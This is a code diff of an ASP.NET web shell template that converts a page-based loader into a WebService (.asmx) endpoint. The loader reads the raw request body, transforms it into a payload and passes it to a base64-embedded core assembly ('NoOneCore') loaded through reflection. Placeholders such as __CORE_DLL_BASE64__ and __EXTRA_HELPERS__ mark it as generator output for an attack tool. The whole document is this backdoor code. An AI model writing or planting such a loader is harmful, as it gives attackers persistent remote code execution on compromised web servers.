@@ -1,11 +1,14 @@
-<%@ Page Language="C#" %>
+<%@ WebService Language="C#" Class="App" %>
 <%@ Import Namespace="System" %>
 <%@ Import Namespace="System.IO" %>
 <%@ Import Namespace="System.Reflection" %>
 <%@ Import Namespace="System.Text" %>
+<%@ Import Namespace="System.Web" %>
 __EXTRA_IMPORTS__
 
 <script runat="server">
+public class App : System.Web.Services.WebService
+{
     private const string CoreTypeName = "dotnet_core.NoOneCore";
 
     private static readonly object CoreLock = new object();
@@ -15,7 +18,23 @@ __EXTRA_IMPORTS__
 __CORE_DLL_BASE64__
 ".Replace("\r", string.Empty).Replace("\n", string.Empty);
 
-    protected void Page_Load(object sender, EventArgs e)
+    private HttpContext CurrentContext
+    {
+        get { return HttpContext.Current; }
+    }
+
+    private HttpRequest Request
+    {
+        get { return CurrentContext.Request; }
+    }
+
+    private HttpResponse Response
+    {
+        get { return CurrentContext.Response; }
+    }
+
+    [System.Web.Services.WebMethod]
+    public void Execute()
     {
         Response.TrySkipIisCustomErrors = true;
 
@@ -28,6 +47,8 @@ __CORE_DLL_BASE64__
 
         try
         {
+            Request.InputStream.Seek(0, SeekOrigin.Begin);
+
             object noOneCore = GetOrInitCore();
             byte[] rawBody = ReadAllBytes(Request.InputStream);
             byte[] payload = TransformReqPayload(GetArgFromContent(rawBody));
@@ -108,4 +129,5 @@ __WRAP_RES_DATA__
 __WRAP_RESPONSE__
 
 __EXTRA_HELPERS__
+}
 </script>
